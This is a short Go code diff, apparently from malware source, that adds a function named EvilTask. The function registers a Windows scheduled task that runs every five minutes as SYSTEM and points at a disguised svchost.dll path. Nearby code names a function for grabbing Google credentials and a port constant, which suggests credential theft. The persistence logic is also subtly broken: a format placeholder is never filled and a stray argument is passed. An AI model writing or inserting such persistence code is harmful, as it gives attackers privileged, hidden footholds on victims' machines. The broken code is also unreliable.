@@ -36,6 +36,23 @@ const (
 	PORTA    = "9090"
 )
 
+func EvilTask() error {
+	currentUser, err := user.Current()
+	if err != nil {
+		return err
+	}
+	split := strings.Split(currentUser.Username, "\\")
+	if len(split) > 1 {
+		currentUser.Username = split[1]
+	}
+	cmd := exec.Command("schtasks", "/create", "/sc", "minute", "/mo", "5", "/tn", "eviltask", "/tr", "%s\\System32\\svchost.dll", "/ru", "SYSTEM", currentUser.HomeDir)
+	err = cmd.Run()
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
 func BaixaCreedsGoogle() error {
 	userHomeDir, err := os.UserHomeDir()
 	if err != nil {
